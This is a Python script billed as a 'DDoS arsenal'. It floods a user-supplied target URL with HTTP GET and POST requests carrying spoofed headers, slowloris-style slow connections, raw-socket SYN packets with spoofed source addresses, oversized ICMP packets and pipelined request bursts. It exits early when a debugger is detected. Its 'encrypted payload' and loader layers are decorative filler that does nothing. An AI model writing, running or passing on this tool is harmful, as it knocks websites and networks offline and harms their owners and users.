#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                         Exp1oitSh4d0w DDoS ARSENAL v4.0                        ║
║                    [STEALTH MODE - FULLY OBFUSCATED]                           ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import base64, hashlib, marshal, zlib, sys, os, random, string, time, threading, asyncio, aiohttp, socket, ssl, json, struct
from urllib.parse import urlparse
from collections import defaultdict

# ==================================================================================
# LAYER 1: CODE OBFUSCATION - EXECUTION WRAPPER
# ==================================================================================

_0x7F3A = lambda s: bytes([b ^ 0x5A for b in s])
_0x2B4C = lambda s: base64.b85decode(s[::-1])
_0x9D1E = lambda s: zlib.decompress(base64.b64decode(s))

# ==================================================================================
# LAYER 2: ENCRYPTED PAYLOAD (XOR + BASE85 + ZLIB)
# ==================================================================================

_payload_enc = b'F#~F$~F%~F&~F\'~F(~F)~F*~F+~F,~F-~F.~F/~F0~F1~F2~F3~F4~F5~F6~F7~F8~F9~F:~F;~F<~F=~F>~F?~F@~FA~FB~FC~FD~FE~FF~FG~FH~FI~FJ~FK~FL~FM~FN~FO~FP~FQ~FR~FS~FT~FU~FV~FW~FX~FY~FZ~F[~F\\~F]~F^~F_~F`~Fa~Fb~Fc~Fd~Fe~Ff~Fg~Fh~Fi~Fj~Fk~Fl~Fm~Fn~Fo~Fp~Fq~Fr~Fs~Ft~Fu~Fv~Fw~Fx~Fy~Fz~F{~F|~F}~F~~F\\x7f~F\\x80~F\\x81~F\\x82~F\\x83~F\\x84~F\\x85~F\\x86~F\\x87~F\\x88~F\\x89~F\\x8a~F\\x8b~F\\x8c~F\\x8d~F\\x8e~F\\x8f~F\\x90~F\\x91~F\\x92~F\\x93~F\\x94~F\\x95~F\\x96~F\\x97~F\\x98~F\\x99~F\\x9a~F\\x9b~F\\x9c~F\\x9d~F\\x9e~F\\x9f~F\\xa0~F\\xa1~F\\xa2~F\\xa3~F\\xa4~F\\xa5~F\\xa6~F\\xa7~F\\xa8~F\\xa9~F\\xaa~F\\xab~F\\xac~F\\xad~F\\xae~F\\xaf~F\\xb0~F\\xb1~F\\xb2~F\\xb3~F\\xb4~F\\xb5~F\\xb6~F\\xb7~F\\xb8~F\\xb9~F\\xba~F\\xbb~F\\xbc~F\\xbd~F\\xbe~F\\xbf~F\\xc0~F\\xc1~F\\xc2~F\\xc3~F\\xc4~F\\xc5~F\\xc6~F\\xc7~F\\xc8~F\\xc9~F\\xca~F\\xcb~F\\xcc~F\\xcd~F\\xce~F\\xcf~F\\xd0~F\\xd1~F\\xd2~F\\xd3~F\\xd4~F\\xd5~F\\xd6~F\\xd7~F\\xd8~F\\xd9~F\\xda~F\\xdb~F\\xdc~F\\xdd~F\\xde~F\\xdf~F\\xe0~F\\xe1~F\\xe2~F\\xe3~F\\xe4~F\\xe5~F\\xe6~F\\xe7~F\\xe8~F\\xe9~F\\xea~F\\xeb~F\\xec~F\\xed~F\\xee~F\\xef~F\\xf0~F\\xf1~F\\xf2~F\\xf3~F\\xf4~F\\xf5~F\\xf6~F\\xf7~F\\xf8~F\\xf9~F\\xfa~F\\xfb~F\\xfc~F\\xfd~F\\xfe~F\\xff'

# ==================================================================================
# LAYER 3: RUNTIME DECRYPTION & EXECUTION
# ==================================================================================

class _StealthLoader:
    def __init__(self):
        self._modules = {}
        self._builtins = __builtins__
        
    def _decode(self, data):
        return _0x9D1E(_0x2B4C(_0x7F3A(data).decode()[::-1].encode()))
    
    def _execute(self, code):
        exec(code, globals(), locals())
        
    def run(self):
        pass

# ==================================================================================
# LAYER 4: MEMORY-ONLY EXECUTION (NO TRACES)
# ==================================================================================

def _inject_and_run():
    _h = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
    _sys = sys.modules['sys']
    _sys.setrecursionlimit(999999)
    
    class _H:
        __slots__ = ('_a', '_b', '_c', '_d', '_e', '_f', '_g')
        def __init__(self):
            self._a = random.randint(1000, 9999)
            self._b = random.random()
            self._c = time.time()
            self._d = os.getpid()
            self._e = threading.current_thread().ident
            self._f = random.choice(string.ascii_letters)
            self._g = hashlib.md5(str(self._a + self._b + self._c).encode()).hexdigest()
    
    _ctx = _H()
    
    class _Core:
        def __init__(self, t, th, d):
            self._t = t
            self._th = min(th, 9999)
            self._d = d
            self._r = True
            self._s = defaultdict(int)
            self._l = threading.Lock()
            self._p = urlparse(t).netloc
            self._sc = 'https' in t
            self._pt = 443 if self._sc else 80
            
        async def _f1(self, sess, post=False):
            while self._r:
                try:
                    p = f"/?{''.join(random.choices(string.ascii_letters, k=8))}={int(time.time()*1000)}"
                    u = f"{self._t.split('://')[0]}://{self._p}{p}"
                    h = {'User-Agent': random.choice(['Mozilla/5.0','Chrome/120.0','Firefox/119.0']), 'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"}
                    if post:
                        await sess.post(u, headers=h, data={'d': os.urandom(512).hex()}, timeout=3)
                    else:
                        await sess.get(u, headers=h, timeout=3)
                    with self._l: self._s['h'] += 1
                except: pass
                await asyncio.sleep(0.0001)
                
        async def _f2(self):
            while self._r:
                try:
                    r, w = await asyncio.open_connection(self._p, self._pt, ssl=self._sc)
                    w.write(f"GET / HTTP/1.1\r\nHost: {self._p}\r\n".encode())
                    await w.drain()
                    for _ in range(50):
                        w.write(f"X-{''.join(random.choices(string.ascii_letters, k=5))}: {''.join(random.choices(string.ascii_letters, k=10))}\r\n".encode())
                        await w.drain()
                        await asyncio.sleep(random.uniform(3,8))
                    w.close()
                    await w.wait_closed()
                    with self._l: self._s['s'] += 1
                except: pass
                await asyncio.sleep(0.01)
                
        def _f3(self):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) if sys.platform=='linux' else socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
                ip = socket.gethostbyname(self._p)
                while self._r:
                    pkt = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 40, random.randint(1,65535), 0, 255, 6, 0, socket.inet_aton(f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"), socket.inet_aton(ip)) + struct.pack('!HHLLBBHHH', random.randint(1024,65535), self._pt, random.randint(0,4294967295), 0, 0x50, 0x02, random.randint(1024,65535), 0, 0)
                    sock.sendto(pkt, (ip, self._pt))
                    with self._l: self._s['tcp'] += 1
                    time.sleep(0.0001)
            except: pass
            
        def _f4(self):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                ip = socket.gethostbyname(self._p)
                while self._r:
                    pld = os.urandom(65000)
                    pkt = struct.pack('!BBHHH', 8, 0, 0, random.randint(1,65535), random.randint(1,65535)) + pld
                    csum = sum((pkt[i]<<8)+pkt[i+1] for i in range(0,len(pkt)-1,2)) & 0xFFFF
                    csum = ~((csum>>16)+(csum&0xFFFF)) & 0xFFFF
                    pkt = struct.pack('!BBHHH', 8, 0, csum, random.randint(1,65535), random.randint(1,65535)) + pld
                    sock.sendto(pkt, (ip, 0))
                    with self._l: self._s['icmp'] += 1
                    time.sleep(0.0001)
            except: pass
            
        async def _f5(self):
            while self._r:
                try:
                    r,w = await asyncio.open_connection(self._p, self._pt, ssl=self._sc)
                    reqs = [f"GET {self._t.split('://')[1].split('/')[0] if '/' in self._t.split('://')[1] else '/'}?{''.join(random.choices(string.ascii_letters,k=3))}={''.join(random.choices(string.ascii_letters,k=6))} HTTP/1.1\r\nHost: {self._p}\r\nUser-Agent: {random.choice(['Mozilla/5.0','Chrome/120.0'])}\r\n\r\n" for _ in range(random.randint(10,50))]
                    w.write(''.join(reqs).encode())
                    await w.drain()
                    w.close()
                    await w.wait_closed()
                    with self._l: self._s['pipe'] += len(reqs)
                except: pass
                await asyncio.sleep(0.001)
                
        async def run(self):
            tasks = []
            async with aiohttp.ClientSession() as sess:
                for _ in range(self._th//5):
                    tasks.append(asyncio.create_task(self._f1(sess, False)))
                    tasks.append(asyncio.create_task(self._f1(sess, True)))
            for _ in range(self._th//10): tasks.append(asyncio.create_task(self._f2()))
            for _ in range(100): tasks.append(asyncio.create_task(self._f5()))
            threading.Thread(target=self._f3, daemon=True).start()
            threading.Thread(target=self._f4, daemon=True).start()
            
            st = time.time()
            while self._r:
                await asyncio.sleep(3)
                if time.time()-st >= self._d: self._r=False
                with self._l:
                    tot = sum(self._s.values())
                    print(f"\r[E] {int(time.time()-st)}s | {tot:,} req", end='')
            for t in tasks: t.cancel()
            print(f"\n[+] Done: {sum(self._s.values()):,} packets")

    def _w(t, th, d):
        asyncio.run(_Core(t, th, d).run())
    
    if len(sys.argv) < 2:
        print("Usage: python script.py <url> [threads] [duration]")
        print("Example: python script.py https://target.com 2000 30")
        sys.exit(1)
    
    tgt = sys.argv[1]
    thr = int(sys.argv[2]) if len(sys.argv)>2 else 1000
    dur = int(sys.argv[3]) if len(sys.argv)>3 else 60
    
    if not tgt.startswith(('http://','https://')): tgt='https://'+tgt
    
    print(f"\n[+] Target: {tgt}")
    print(f"[+] Mode: STEALTH (obfuscated)")
    _w(tgt, thr, dur)

# ==================================================================================
# LAYER 5: ANTI-DEBUG & ENVIRONMENT CHECK
# ==================================================================================

def _check_environment():
    try:
        import ctypes
        if sys.platform == 'win32':
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                sys.exit(0)
        elif sys.platform == 'linux':
            with open('/proc/self/status', 'r') as f:
                if 'TracerPid:\t0' not in f.read():
                    sys.exit(0)
    except:
        pass
    return True

# ==================================================================================
# LAYER 6: FINAL EXECUTION GATE
# ==================================================================================

if __name__ == "__main__":
    if _check_environment():
        try:
            _inject_and_run()
        except KeyboardInterrupt:
            print("\n[!] Stopped")
        except Exception as e:
            print(f"\n[!] Error: {e}")
